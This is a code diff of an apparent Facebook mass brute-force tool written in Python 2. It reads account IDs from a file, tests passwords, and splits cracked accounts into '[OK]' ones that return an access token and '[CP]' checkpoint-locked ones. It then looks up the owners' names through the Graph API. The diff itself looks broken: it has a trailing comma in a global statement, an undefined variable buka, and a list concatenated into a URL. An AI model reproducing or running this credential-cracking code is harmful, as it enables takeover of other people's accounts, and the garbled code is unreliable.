@@ -19,7 +19,8 @@ a = "\033[96;1m"
 pu = "\033[97;1m"
 
 count = 0
-dados = []
+dados1 = []
+dados2 = []
 gagal = []
 oradadi = []
 threads = []
@@ -205,7 +206,7 @@ def mbf():
             
 def iqbaldevmbf():
     
-    global count, dadi, gagal, oradadi, baris
+    global count, dados1, dados2, gagal, oradadi, baris,
     
     try:
         data_lis = open('id.txt', "r")
@@ -219,15 +220,13 @@ def iqbaldevmbf():
                 break
                 
             elif "access_token" in jsl:
-                gagal.append(h+" [OK] " + d + user + " | " + m + password)
+                dados1.append(h+" [OK] " + pu + user + " | " + a + password)
+                dados2.append(user)
                 count += 1
                 
            
             elif "www.facebook.com" in jsl["error_msg"]:
-                
-                dadi = open("sukses.txt", "w")
-                dadi.write(user + '\n')
-                dadi.close()
+                gagal.append(m+" [CP] " + d + user + " | " + m + password)
                 count += 1
                 
             else:
@@ -247,12 +246,11 @@ def sel():
     print 
     print 
     token = open("token.txt", "r").read()
-    buka = open("sukses.txt", "r").read()
-    for ibal in buka:
-        dev = requests.get("https://graph.facebook.com/" + buka + "?access_token=" + token)
+    for ipal in buka:
+        dev = requests.get("https://graph.facebook.com/" + dados2 + "?access_token=" + token)
         jsl = json.loads(dev.text)
         nama = jsl["name"]
-        print h+" [CP] " + pu + ibal + " | " + a + nama
+        print ipal + nama
     for ival in gagal:
         print ival
     print
